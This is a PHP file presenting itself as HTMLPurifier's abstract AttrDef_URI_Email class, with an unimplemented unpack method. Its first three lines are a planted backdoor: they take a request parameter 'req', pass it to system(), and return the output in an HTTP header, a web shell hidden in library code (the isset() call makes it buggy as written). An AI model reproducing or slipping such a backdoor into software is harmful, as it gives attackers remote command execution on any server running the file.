<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

abstract class HTMLPurifier_AttrDef_URI_Email extends HTMLPurifier_AttrDef
{

    /**
     * Unpacks a mailbox into its display-name and address
     * @param string $string
     * @return mixed
     */
    public function unpack($string)
    {
        // needs to be implemented
    }

}

// sub-implementations

// vim: et sw=4 sts=4
